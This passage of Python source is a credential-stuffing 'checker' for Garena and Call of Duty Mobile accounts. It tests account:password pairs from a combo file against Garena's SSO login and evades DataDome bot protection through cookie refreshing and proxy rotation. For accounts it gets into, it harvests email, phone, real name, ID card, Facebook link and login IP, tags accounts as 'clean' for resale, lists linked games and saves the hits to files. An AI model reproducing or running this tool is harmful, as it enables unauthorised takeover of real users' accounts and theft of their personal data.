        return None, "error"

def get_codm_user_info(session, token):
    try:
        check_login_url = "https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/"
        check_headers = {
            "authority": "api-delete-request-aos.codm.garena.co.id",
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br, zstd",
            "cache-control": "no-cache",
            "codm-delete-token": token,
            "origin": "https://delete-request.codm.garena.co.id",
            "pragma": "no-cache",
            "referer": "https://delete-request.codm.garena.co.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        check_response = session.get(check_login_url, headers=check_headers, timeout=12)
        check_data = check_response.json()
        user_data = check_data.get("user", {})
        if user_data:
            region_code = user_data.get("region", "N/A")
            formatted_region = format_codm_region(region_code)
            return {
                "codm_nickname": user_data.get("codm_nickname", "N/A"),
                "codm_level": user_data.get("codm_level", "N/A"),
                "region": formatted_region,
                "region_code": region_code,
                "uid": user_data.get("uid", "N/A"),
                "open_id": user_data.get("open_id", "N/A"),
                "t_open_id": user_data.get("t_open_id", "N/A")
            }
        return {}
    except Exception:
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    try:
        access_token = get_codm_access_token(session)
        if not access_token:
            return has_codm, codm_info
        codm_token, status = process_codm_callback(session, access_token)
        if status == "no_codm":
            return has_codm, codm_info
        elif status != "success" or not codm_token:
            return has_codm, codm_info
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
    except Exception:
        pass
    return has_codm, codm_info

def parse_account_details(data):
    user_info = data.get('user_info', {})
    fb_username = "N/A"
    fb_uid = "N/A"
    if user_info.get('fb_account'):
        fb_username = user_info.get('fb_account', {}).get('fb_username', 'N/A')
        fb_uid = user_info.get('fb_account', {}).get('fb_uid', 'N/A')
    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)),
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),
        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },
        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': user_info.get('country_code', 'N/A'),
            'mobile_no': user_info.get('mobile_no', 'N/A'),
            'mobile_binding_status': "Bound" if user_info.get('mobile_binding_status', 0) else "Not Bound",
            'extra_data': user_info.get('realinfo_extra_data', {})
        },
        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },
        'status': {
            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive",
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },
        'facebook': {
            'fb_username': fb_username,
            'fb_uid': fb_uid
        },
        'binds': [],
        'game_info': []
    }
    mobile_no = account_info['personal']['mobile_no']
    email_verified = 1 if account_info['email_verified'] else 0
    mobile_is_na = (mobile_no == 'N/A' or not mobile_no or str(mobile_no).strip() == '')
    is_clean = mobile_is_na and email_verified == 0
    email = account_info['email']
    id_card = account_info['personal']['id_card']
    if email and email != 'N/A' and str(email).strip() and not email.startswith('***'):
        if email_verified == 1:
            account_info['binds'].append('Email (Verified)')
        else:
            account_info['binds'].append('Email')
    if not mobile_is_na:
        account_info['binds'].append('Phone')
    if account_info['security']['facebook_connected'] and fb_uid and fb_uid != 'N/A':
        account_info['binds'].append('Facebook')
    if id_card and id_card != 'N/A' and str(id_card).strip():
        account_info['binds'].append('ID Card')
    if account_info['security']['two_step_verify']:
        account_info['binds'].append('2FA')
    if account_info['security']['authenticator_app']:
        account_info['binds'].append('Authenticator')
    account_info['bind_status'] = "Clean" if is_clean else "Not Clean" if account_info['binds'] else "Not Clean"
    account_info['is_clean'] = is_clean
    return account_info

def display_codm_info(account, password, details, codm_info, has_codm, error_reason=None, game_connections=None):
    if details is None:
        if error_reason is None:
            error_reason = "Incorrect Password"
        tbl = Table(show_header=False, box=None, padding=(0, 1))
        tbl.add_column(style="bold red", min_width=16, no_wrap=True)
        tbl.add_column(style="white", no_wrap=False)
        tbl.add_row("Login", f"[dim]{account}:{password}[/dim]")
        tbl.add_row("Reason", f"[bold red]{error_reason}[/bold red]")
        console.print(Panel(tbl, title="[bold red]✗  INVALID[/bold red]", border_style="red", padding=(0, 1)))
        return
    email = details.get('email', 'N/A')
    email_verified = details.get('email_verified', False)
    username = details.get('username', 'N/A')
    mobile = details['personal'].get('mobile_no', 'N/A')
    country_code = details['personal'].get('country_code', 'N/A')
    shell = details['profile'].get('shell_balance', 0)
    is_clean = details.get('is_clean', False)
    bind_status = "Clean" if is_clean else "Not Clean"
    formatted_mobile = format_mobile_number(mobile, country_code)
    if email and email != 'N/A' and '@' in email:
        verification_status = "(Verified)" if email_verified else "(Not Verified)"
        email_display = f"{email} {verification_status}"
    else:
        email_display = "N/A"
    fb_username = details['facebook']['fb_username']
    fb_uid = details['facebook']['fb_uid']
    if fb_uid != 'N/A' and fb_uid:
        fb_link = f"https://www.facebook.com/profile.php?id={fb_uid}"
    else:
        fb_link = "N/A"
    if fb_uid == 'N/A' or not fb_uid:
        fb_info = "NOT CONNECTED"
        fb_info_color = "white"
        fb_username = "N/A"
        fb_link = "N/A"
    elif not fb_username or fb_username == 'N/A':
        fb_info = "FB UNBIND or FB DELETED"
        fb_info_color = "yellow"
        fb_username = "N/A"
    else:
        fb_info = "CONNECTED"
        fb_info_color = "green"
    login_history = details.get("login_history", [])
    last_login_info = login_history[0] if login_history else {}
    last_login = last_login_info.get('timestamp', 0)
    last_login_date = time.strftime("%B %d, %Y | %I:%M %p", time.localtime(last_login)) if last_login else "N/A"
    last_login_where = f"{last_login_info.get('source', 'Unknown')}" if last_login_info else "Unknown"
    ipk = last_login_info.get('ip', 'N/A') if last_login_info else 'N/A'
    ipc = last_login_info.get('country', 'N/A') if last_login_info else 'N/A'
    def _row(t, label, val, vc="bright_white"):
        t.add_row(f"[bold cyan]{label}[/bold cyan]", f"[{vc}]{val}[/{vc}]")
    if has_codm and codm_info:
        if is_clean:
            border = "bright_green"
            title = "[bold bright_green]✔  CLEAN[/bold bright_green]"
            status_color = "bright_green"
        else:
            border = "yellow"
            title = "[bold yellow]●  NOT CLEAN[/bold yellow]"
            status_color = "yellow"
        lvl = codm_info.get("codm_level", "N/A")
        tbl = Table(show_header=False, box=None, padding=(0, 1))
        tbl.add_column(style=f"bold {border}", min_width=18, no_wrap=True)
        tbl.add_column(style="bright_white", no_wrap=False)
        _row(tbl, "Login", f"{account}:{password}", "bright_white")
        _row(tbl, "Username", username)
        _row(tbl, "Shell", str(shell), "bright_white" if int(shell or 0) == 0 else "bright_yellow")
        _row(tbl, "Email", email_display)
        _row(tbl, "Mobile", str(formatted_mobile))
        _row(tbl, "Facebook", fb_info, fb_info_color)
        tbl.add_row("", "")
        _row(tbl, "CODM Level", str(lvl), "bright_cyan")
        _row(tbl, "Server", str(codm_info.get("region","N/A")), "bright_cyan")
        _row(tbl, "IGN", str(codm_info.get("codm_nickname","N/A")), "bright_cyan")
        _row(tbl, "CODM UID", str(codm_info.get("uid","N/A")), "bright_cyan")
        tbl.add_row("", "")
        _row(tbl, "Last Login", last_login_date, "dim")
        _row(tbl, "Login From", last_login_where, "dim")
        _row(tbl, "Login IP", ipk, "dim")
        _row(tbl, "Login Country", ipc, "dim")
        other_games = [g for g in (game_connections or []) if g.get("game","").upper() != "CODM"]
        if other_games:
            tbl.add_row("", "")
            for g in other_games:
                gname = g.get("game", "?")
                grole = g.get("role", "N/A")
                greg = g.get("region", "")
                label = f"{gname} [{greg}]" if greg else gname
                _row(tbl, label, grole, "bright_magenta")
        tbl.add_row("", "")
        _row(tbl, "Status", bind_status, status_color)
        console.print(Panel(tbl, title=title, border_style=border, padding=(0, 1)))
    else:
        nc_border = "bright_magenta" if [g for g in (game_connections or []) if g.get("game","").upper() != "CODM"] else "cyan"
        tbl = Table(show_header=False, box=None, padding=(0, 1))
        tbl.add_column(style=f"bold {nc_border}", min_width=18, no_wrap=True)
        tbl.add_column(style="bright_white", no_wrap=False)
        _row(tbl, "Login", f"{account}:{password}", "bright_white")
        _row(tbl, "Username", username)
        _row(tbl, "Shell", str(shell), "bright_white" if int(shell or 0) == 0 else "bright_yellow")
        _row(tbl, "Email", email_display)
        _row(tbl, "Mobile", str(formatted_mobile))
        _row(tbl, "Facebook", fb_info, fb_info_color)
        tbl.add_row("", "")
        _row(tbl, "CODM", "NO CODM ACCOUNT", "red")
        tbl.add_row("", "")
        _row(tbl, "Last Login", last_login_date, "dim")
        _row(tbl, "Login From", last_login_where, "dim")
        _row(tbl, "Login IP", ipk, "dim")
        _row(tbl, "Login Country", ipc, "dim")
        other_games = [g for g in (game_connections or []) if g.get("game","").upper() != "CODM"]
        if other_games:
            tbl.add_row("", "")
            for g in other_games:
                gname = g.get("game", "?")
                grole = g.get("role", "N/A")
                greg = g.get("region", "")
                label = f"{gname} [{greg}]" if greg else gname
                _row(tbl, label, grole, "bright_magenta")
        tbl.add_row("", "")
        _row(tbl, "Status", bind_status, nc_border)
        if other_games:
            game_names = " / ".join(g.get("game","?") for g in other_games)
            nc_title = f"[bold bright_magenta]◆  NO CODM[/bold bright_magenta] [dim]({game_names})[/dim]"
        else:
            nc_title = "[bold cyan]○  NO CODM[/bold cyan]"
        console.print(Panel(tbl, title=nc_title, border_style=nc_border, padding=(0, 1)))

def display_codm_info_elegant(account, password, details, codm_info, has_codm, error_reason=None, game_connections=None):
    display_codm_info(account, password, details, codm_info, has_codm, error_reason, game_connections)

_auto_remove_queue = []
_auto_remove_lock = threading.Lock()
_auto_remove_batch = 50

def _flush_auto_remove(file_manager, combo_file_path, force=False):
    with _auto_remove_lock:
        if not _auto_remove_queue:
            return
        if not force and len(_auto_remove_queue) < _auto_remove_batch:
            return
        batch = list(_auto_remove_queue)
        _auto_remove_queue.clear()
    if not batch:
        return
    target_set = set(b.strip() for b in batch)
    try:
        fp = Path(combo_file_path)
        with file_manager._file_lock:
            with open(fp, 'r', encoding='utf-8', errors='ignore') as fh:
                lines = fh.readlines()
            with open(fp, 'w', encoding='utf-8') as fh:
                for line in lines:
                    if line.strip() not in target_set:
                        fh.write(line)
    except Exception:
        pass

def _queue_auto_remove(account, password, file_manager, combo_file_path):
    with _auto_remove_lock:
        _auto_remove_queue.append(f"{account}:{password}")
    if len(_auto_remove_queue) >= _auto_remove_batch:
        threading.Thread(target=_flush_auto_remove, args=(file_manager, combo_file_path), daemon=True).start()

def get_game_connections(session, account):
    game_info = []
    valid_regions = {"sg", "ph", "my", "tw", "th", "id", "in", "vn"}
    game_mappings = {
        "tw": {
            "100082": "CODM", "100067": "FREE FIRE", "100070": "SPEED DRIFTERS",
            "100130": "BLACK CLOVER M", "100105": "GARENA UNDAWN", "100050": "ROV",
            "100151": "DELTA FORCE", "100147": "FAST THRILL", "100107": "MOONLIGHT BLADE",
        },
        "th": {
            "100067": "FREEFIRE", "100055": "ROV", "100082": "CODM",
            "100151": "DELTA FORCE", "100105": "GARENA UNDAWN", "100130": "BLACK CLOVER M",
            "100070": "SPEED DRIFTERS", "32836": "FC ONLINE", "100071": "FC ONLINE M",
            "100124": "MOONLIGHT BLADE",
        },
        "vn": {
            "32837": "FC ONLINE", "100072": "FC ONLINE M",
            "100054": "ROV", "100137": "THE WORLD OF WAR",
        },
        "default": {
            "100082": "CODM", "100067": "FREEFIRE", "100151": "DELTA FORCE",
            "100105": "GARENA UNDAWN", "100057": "AOV", "100070": "SPEED DRIFTERS",
            "100130": "BLACK CLOVER M", "100055": "ROV",
        },
    }
    try:
        token_url = "https://authgop.garena.com/oauth/token/grant"
        token_data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}"
        token_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Pragma": "no-cache", "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded"}
        try:
            token_resp = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
            access_token = token_resp.json().get("access_token", "")
        except Exception:
            return []
        if not access_token:
            return []
        inspect_url = "https://shop.garena.sg/api/auth/inspect_token"
        inspect_hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*", "Content-Type": "application/json"}
        try:
            inspect_resp = session.post(inspect_url, headers=inspect_hdrs, json={"token": access_token}, timeout=15)
            inspect_json = inspect_resp.json()
        except Exception:
            return []
        session_key = inspect_resp.cookies.get("session_key")
        if not session_key:
            return []
        uac = inspect_json.get("uac", "ph").lower()
        region = uac if uac in valid_regions else "ph"
        if region in ("th", "in"):
            base_domain = "termgame.com"
        elif region == "id":
            base_domain = "kiosgamer.co.id"
        elif region == "vn":
            base_domain = "napthe.vn"
        else:
            base_domain = f"shop.garena.{region}"
        applicable = game_mappings.get(region, game_mappings["default"])
        for app_id, game_name in applicable.items():
            roles_url = f"https://{base_domain}/api/shop/apps/roles"
            roles_hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "application/json, text/plain, */*", "Referer": f"https://{base_domain}/?app={app_id}", "Cookie": f"session_key={session_key}"}
            try:
                roles_resp = session.get(roles_url, params={"app_id": app_id}, headers=roles_hdrs, timeout=15)
                roles_data = roles_resp.json()
            except Exception:
                continue
            role = None
            if isinstance(roles_data.get("role"), list) and roles_data["role"]:
                role = roles_data["role"][0]
            elif app_id in roles_data and isinstance(roles_data[app_id], list) and roles_data[app_id]:
                candidate = roles_data[app_id][0]
                role = candidate.get("role") or candidate.get("user_id") if isinstance(candidate, dict) else str(candidate)
            elif isinstance(roles_data, list) and roles_data:
                first = roles_data[0]
                if isinstance(first, dict) and first.get("role"):
                    role = first["role"]
            if role:
                game_info.append({"region": region.upper(), "game": game_name, "role": str(role)})
    except Exception:
        pass
    return game_info

def save_game_folder(account, password, account_data, game_connections, base_dir):
    try:
        games_dir = Path(base_dir) / "Games"
        games_dir.mkdir(parents=True, exist_ok=True)
        identifier = f"{account}:{password}"
        base_entry = (
            f"{identifier}\n"
            f"Email: {account_data.get('email_display', 'N/A')}\n"
            f"Mobile: {account_data.get('formatted_mobile', 'N/A')}\n"
            f"Shell: {account_data.get('shell_balance', 0)}\n"
            f"Country: {account_data.get('country', 'N/A')}\n"
            f"Last Login: {account_data.get('last_login_date', 'N/A')}\n"
            f"Login Location: {account_data.get('last_login_where', 'N/A')}\n"
            f"Login IP: {account_data.get('last_login_ip', 'N/A')}\n"
            f"FB Status: {account_data.get('fb_info', 'N/A')}\n"
            f"Status: {'CLEAN' if account_data.get('is_clean') else 'NOT CLEAN'}\n"
        )
        saved_games = set()
        for g in game_connections:
            gname = g.get("game", "").upper()
            grole = g.get("role", "N/A")
            gregion = g.get("region", "N/A")
            if gname in saved_games:
                continue
            saved_games.add(gname)
            fname = GAME_FILE_MAP.get(gname, f"{gname.replace(' ', '_')}.txt")
            fpath = games_dir / fname
            if gname == "CODM":
                entry = base_entry + f"CODM IGN: {grole}\n" + f"CODM Level: {account_data.get('codm_level', 'N/A')}\n" + f"CODM UID: {account_data.get('codm_uid', 'N/A')}\n" + f"CODM Region: {gregion}\n"
            else:
                entry = base_entry + f"{gname} IGN: {grole}\n" + f"{gname} Region: {gregion}\n"
            already = False
            if fpath.exists():
                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                    if identifier in f.read():
                        already = True
            if not already:
                with open(fpath, "a", encoding="utf-8", errors="replace") as f:
                    f.write(entry.strip() + "\n\n")
    except Exception:
        pass

def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, results_manager, file_manager=None, combo_file_path=None, auto_remove=False, use_elegant_display=False):
    max_retries = 2
    MAX_PROXY_RETRIES = 3
    proxy_retry_count = 0
    def display_info(acc, pwd, det, codm, has, error_reason=None, gc=None):
        if use_elegant_display:
            display_codm_info_elegant(acc, pwd, det, codm, has, error_reason, gc)
        else:
            display_codm_info(acc, pwd, det, codm, has, error_reason, gc)
    for attempt in range(max_retries + MAX_PROXY_RETRIES):
        try:
            datadome_manager.clear_session_datadome(session)
            current_datadome = datadome_manager.get_datadome()
            if current_datadome:
                datadome_manager.set_session_datadome(session, current_datadome)
            else:
                datadome = get_datadome_cookie(session)
                if datadome:
                    datadome_manager.set_datadome(datadome)
                    datadome_manager.set_session_datadome(session, datadome)
            v1, v2, new_datadome = prelogin(session, account, datadome_manager)
            if v1 == "IP_BLOCKED":
                if (attempt - proxy_retry_count) < max_retries - 1:
                    fresh = get_datadome_cookie(session)
                    if fresh:
                        datadome_manager.set_datadome(fresh)
                        datadome_manager.set_session_datadome(session, fresh)
                    if not _proxy_active():
                        console.print(f"  [yellow]IP blocked, retrying ({attempt - proxy_retry_count + 1}/{max_retries})[/yellow]")
                    time.sleep(0.5)
                    continue
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'IP Blocked'}
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return
            if not v1 or not v2:
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "Account Doesn't Exist"}
                results_manager.add_account(account_data)
                display_info(account, password, None, None, False, error_reason="Account Doesn't Exist!")
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return
            if new_datadome:
                datadome_manager.set_datadome(new_datadome)
                datadome_manager.set_session_datadome(session, new_datadome)
            sso_key = login(session, account, password, v1, v2)
            if not sso_key:
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Credentials'}
                results_manager.add_account(account_data)
                display_info(account, password, None, None, False, error_reason="Incorrect Password")
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            headers = {'accept': '*/*', 'referer': 'https://account.garena.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'}
            if cookie_header:
                headers['cookie'] = cookie_header
            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=12)
            if response.status_code == 403:
                if datadome_manager.handle_403(session):
                    if (attempt - proxy_retry_count) < max_retries - 1:
                        console.print(f"  [yellow]403 error, retrying ({attempt - proxy_retry_count + 1}/{max_retries})[/yellow]")
                        continue
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Cookie Banned/IP Blocked'}
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return
            try:
                account_data_json = response.json()
            except json.JSONDecodeError:
                if (attempt - proxy_retry_count) < max_retries - 1:
                    console.print(f"  [yellow]Invalid response, retrying ({attempt - proxy_retry_count + 1}/{max_retries})[/yellow]")
                    time.sleep(2)
                    continue
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Server Response'}
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return
            if 'error_auth' in account_data_json:
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Incorrect Password'}
                results_manager.add_account(account_data)
                display_info(account, password, None, None, False, error_reason="Incorrect Password")
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return
            if 'error' in account_data_json:
                error_msg = account_data_json.get('error')
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    live_stats.update_stats(valid=False)
                    account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "Account Doesn't Exist"}
                    results_manager.add_account(account_data)
                    display_info(account, password, None, None, False, error_reason="Account Doesn't Exist!")
                    if auto_remove:
                        file_manager.remove_line_from_file(combo_file_path, f"{account}:{password}")
                    return
                else:
                    live_stats.update_stats(is_error=True)
                    account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': error_msg}
                    results_manager.add_account(account_data)
                    display_info(account, password, None, None, False, error_reason=error_msg)
                    if auto_remove:
                        file_manager.remove_line_from_file(combo_file_path, f"{account}:{password}")
                    return
            if 'user_info' in account_data_json:
                details = parse_account_details(account_data_json)
                details['login_history'] = account_data_json.get('login_history', [])
            else:
                details = parse_account_details({'user_info': account_data_json})
            has_codm, codm_info = check_codm_account(session, account)
            game_connections = []
            if CHECK_OTHER_GAMES:
                try:
                    game_connections = get_game_connections(session, account)
                except Exception:
                    pass
            fresh_datadome = datadome_manager.extract_datadome_from_session(session)
            if fresh_datadome:
                cookie_manager.save_cookie(fresh_datadome)
            mobile_no = details['personal']['mobile_no']
            country_code = details['personal'].get('country_code', 'N/A')
            formatted_mobile = format_mobile_number(mobile_no, country_code)
            email = details.get('email', 'N/A')
            email_verified = details.get('email_verified', False)
            if email and email != 'N/A' and '@' in email:
                verification_status = "(Verified)" if email_verified else "(Not Verified)"
                email_display = f"{email} {verification_status}"
            else:
                email_display = "N/A"
            fb_username = details['facebook']['fb_username']
            fb_uid = details['facebook']['fb_uid']
            if fb_uid != 'N/A' and fb_uid:
                fb_link = f"https://www.facebook.com/profile.php?id={fb_uid}"
            else:
                fb_link = "N/A"
            if fb_uid == 'N/A' or not fb_uid:
                fb_info = "NOT CONNECTED"
            elif not fb_username or fb_username == 'N/A':
                fb_info = "FB UNBIND or FB DELETED"
            else:
                fb_info = "CONNECTED"
            login_history = details.get("login_history", [])
            last_login_info = login_history[0] if login_history else {}
            last_login = last_login_info.get('timestamp', 0)
            last_login_date = time.strftime("%B %d, %Y | %I:%M %p", time.localtime(last_login)) if last_login else "N/A"
            last_login_where = f"{last_login_info.get('source', 'Unknown')}" if last_login_info else "Unknown"
            last_login_ip = last_login_info.get('ip', 'N/A') if last_login_info else 'N/A'
            last_login_country = last_login_info.get('country', 'N/A') if last_login_info else 'N/A'
            account_data = {
                'account': account,
                'password': password,
                'uid': details.get('uid', 'N/A'),
                'username': details.get('username', 'N/A'),
                'nickname': details.get('nickname', 'N/A'),
                'email': details.get('email', 'N/A'),
                'email_display': email_display,
                'formatted_mobile': formatted_mobile,
                'country': details['personal'].get('country', 'N/A'),
                'shell_balance': details['profile'].get('shell_balance', 0),
                'account_status': details['status'].get('account_status', 'N/A'),
                'fb_username': fb_username,
                'fb_uid': fb_uid,
                'fb_link': fb_link,
                'fb_info': fb_info,
                'bind_status': details.get('bind_status', 'N/A'),
                'is_clean': details.get('is_clean', False),
                'has_codm': has_codm,
                'is_error': False,
                'last_login_date': last_login_date,
                'last_login_where': last_login_where,
                'last_login_ip': last_login_ip,
                'last_login_country': last_login_country
            }
            if has_codm and codm_info:
                account_data.update({
                    'codm_level': int(codm_info.get('codm_level', 0)),
                    'codm_region': codm_info.get('region', 'N/A'),
                    'codm_nickname': codm_info.get('codm_nickname', 'N/A'),
                    'codm_uid': codm_info.get('uid', 'N/A'),
                    'region_code': codm_info.get('region_code', 'N/A')
                })
            else:
                account_data.update({
                    'codm_level': 0,
                    'codm_region': 'N/A',
                    'codm_nickname': 'N/A',
                    'codm_uid': 'N/A',
                    'region_code': 'N/A'
                })
            results_manager.add_account(account_data)
            codm_level = account_data.get('codm_level', 0)
            live_stats.update_stats(valid=True, clean=details['is_clean'], has_codm=has_codm, codm_level=codm_level, game_connections=game_connections, shell=details['profile'].get('shell_balance', 0))
            if CHECK_OTHER_GAMES and game_connections:
                save_game_folder(account, password, account_data, game_connections, results_manager.base_dir)
            display_info(account, password, details, codm_info, has_codm, gc=game_connections)
            if auto_remove:
                file_manager.remove_line_from_file(combo_file_path, f"{account}:{password}")
            return
        except requests.exceptions.ProxyError:
            proxy_retry_count += 1
            if proxy_retry_count <= MAX_PROXY_RETRIES:
                delay = min(5 + (proxy_retry_count - 1) * 5, 30)
                console.print(f"  [yellow]Proxy fail for {account}, retry in {delay}s ({proxy_retry_count}/{MAX_PROXY_RETRIES})[/yellow]")
                time.sleep(delay)
                for stale_cookie in ('sso_key', 'apple_state_key', 'datadome'):
                    session.cookies.pop(stale_cookie, None)
                apply_proxy_to_session(session)
                continue
            else:
                console.print(f"  [red]{account}: Proxy failed after {MAX_PROXY_RETRIES} retries[/red]")
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': f'Proxy Connection Failed ({MAX_PROXY_RETRIES} retries exhausted)'}
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return
        except requests.exceptions.ConnectionError:
            if (attempt - proxy_retry_count) < max_retries - 1:
                console.print(f"  [yellow]Connection error, retrying ({attempt - proxy_retry_count + 1}/{max_retries})[/yellow]")
                time.sleep(3)
                continue
            else:
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Connection Error'}
                results_manager.add_account(account_data)
                console.print(f"  [red]{account}: Connection error after {max_retries} attempts[/red]")
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return
        except requests.exceptions.Timeout:
            if (attempt - proxy_retry_count) < max_retries - 1:
                console.print(f"  [yellow]Timeout, retrying ({attempt - proxy_retry_count + 1}/{max_retries})[/yellow]")
                time.sleep(3)
                continue
            else:
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Timeout Error'}
                results_manager.add_account(account_data)
                console.print(f"  [red]{account}: Timeout after {max_retries} attempts[/red]")
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return
        except Exception as e:
            if (attempt - proxy_retry_count) < max_retries - 1:
                time.sleep(2)
                continue
            else:
                logger.error(f"[ERROR] Unexpected error processing {account}")
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': f'Unexpected Error: {str(e)}'}
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return

def _prelogin_no_ip_wait(session, account, datadome_manager, max_retries=3):
    url = "https://sso.garena.com/api/prelogin"
    for attempt in range(max_retries):
        try:
            params = {"app_id": "10100", "account": account, "format": "json", "id": str(int(time.time() * 1000))}
            current_cookies = session.cookies.get_dict()
            cookie_parts = [f"{n}={current_cookies[n]}" for n in ("apple_state_key", "datadome", "sso_key") if n in current_cookies]
            headers = {
                "accept": "application/json, text/plain, */*",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "connection": "keep-alive",
                "host": "sso.garena.com",
                "referer": f"https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}",
                "sec-ch-ua": '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
            }
            if cookie_parts:
                headers["cookie"] = "; ".join(cookie_parts)
            resp = session.get(url, headers=headers, params=params, timeout=10)
            new_dd = resp.cookies.get("datadome")
            if new_dd:
                session.cookies.set("datadome", new_dd, domain=".garena.com")
                datadome_manager.set_datadome(new_dd)
            if resp.status_code == 403:
                fresh = get_datadome_cookie(session)
                if fresh:
                    datadome_manager.set_datadome(fresh)
                    datadome_manager.set_session_datadome(session, fresh)
                    time.sleep(0.3)
                    continue
                return None, None, None
            resp.raise_for_status()
            data = resp.json()
            if "error" in data:
                return None, None, None
            v1 = data.get("v1")
            v2 = data.get("v2")
            if not v1 or not v2:
                return None, None, None
            return v1, v2, new_dd
        except requests.exceptions.ProxyError:
            raise
        except Exception:
            if attempt < max_retries - 1:
                time.sleep(0.3)
            continue
    return None, None, None

def _parse_proxy_line(raw: str) -> str | None:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    if re.match(r"^(https?|socks[45])://", raw, re.IGNORECASE):
        parsed = urllib.parse.urlparse(raw)
        if parsed.hostname and parsed.port:
            return ProxyManager._normalize(raw)
        return None
    if "@" in raw:
        return ProxyManager._normalize("http://" + raw)
    parts = raw.split(":")
    if len(parts) == 2:
        host, port = parts
        if port.isdigit():
            return f"http://{host}:{port}"
        return None
